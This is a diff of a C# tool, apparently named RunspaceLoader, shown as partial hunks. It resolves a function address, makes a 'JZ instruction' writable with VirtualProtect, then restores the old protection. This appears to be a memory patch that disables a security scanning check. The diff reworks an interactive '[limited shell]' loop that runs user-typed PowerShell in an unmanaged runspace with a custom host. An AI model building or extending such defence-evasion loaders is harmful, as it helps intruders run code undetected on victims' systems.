@@ -7,14 +7,18 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
+using System.Globalization;
+using System.Management.Automation.Host;
 using System.Collections.ObjectModel;
 using System.Runtime.InteropServices;
 using System.Data.OleDb;
 using System.Security.Cryptography;
 using System.Xml.Linq;
+using System.Security;
 
 namespace RunspaceLoader
 {
+
     internal class Program
     {
         [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
@@ -60,7 +64,7 @@ namespace RunspaceLoader
 
             var b = GetProcAddress(LoadLibrary(dll), func);
             IntPtr addr = (IntPtr)getAddr(b);
-            Console.WriteLine("Retrieved address of JZ instruction: 0x{0}", addr.ToString("X2"));
+            //Console.WriteLine("Retrieved address of JZ instruction: 0x{0}", addr.ToString("X2"));
 
             _ = VirtualProtect(addr, 1, 0x04, out uint oldProtect);
             
@@ -69,7 +73,7 @@ namespace RunspaceLoader
 
             // Restore Region to RX
             _ = VirtualProtect(addr, 1, oldProtect, out uint _);
-            Console.WriteLine("[+] Old protections restored, but tread carefully!");
+            Console.WriteLine("[+] Old permissions restored. Tread carefully!\n\n");
 #endif
             string userInput;
 
@@ -78,34 +82,39 @@ namespace RunspaceLoader
                 Console.Write("[limited shell] ~$ ");
                 userInput = Console.ReadLine();
                 StringBuilder sb = new StringBuilder();
-                Runspace rs = RunspaceFactory.CreateRunspace();
-                rs.Open();
 
-                // Create Runspace
-                RunspaceInvoke invoke = new RunspaceInvoke();
-
-                // Create Pipeline
-                Pipeline pipeline = rs.CreatePipeline();
-
-                // Add commands and invoke
-                pipeline.Commands.AddScript(userInput);
-                pipeline.Commands.Add("Out-String");
-                try
+                // TODO 
+                /*              InitialSessionState initialSessionState = InitialSessionState.CreateDefault();
+                                initialSessionState.ExecutionPolicy = Microsoft.PowerShell.ExecutionPolicy.Bypass;*/
+                var myHost = new CustomPSHost();
+                var initialSessionState = InitialSessionState.CreateDefault();
+                using (var runspace = RunspaceFactory.CreateRunspace(myHost, initialSessionState))
                 {
-                    Collection<PSObject> output = pipeline.Invoke();
-                    rs.Close();
-                    foreach (PSObject line in output)
+                    runspace.Open();
+
+                    using (var pipeline = runspace.CreatePipeline())
                     {
-                        sb.AppendLine(line.ToString());
-                    }
-                }
+                        pipeline.Commands.AddScript(userInput);
+                        // pipeline.Commands.Add("Out-String");
 
-                catch (Exception ex)
-                {
-                    sb.AppendLine(ex.ToString());
+                        try
+                        {
+                            Collection<PSObject> output = pipeline.Invoke();
+                            foreach (PSObject line in output)
+                            {
+                                sb.AppendLine(line.ToString());
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            sb.AppendLine("Error: " + ex.Message);
+                        }
+                    }
+                    runspace.Close();
                 }
 
                 Console.WriteLine(sb.ToString());
+                Console.WriteLine(myHost.Output);
             }
             while (userInput != "exit");
         }
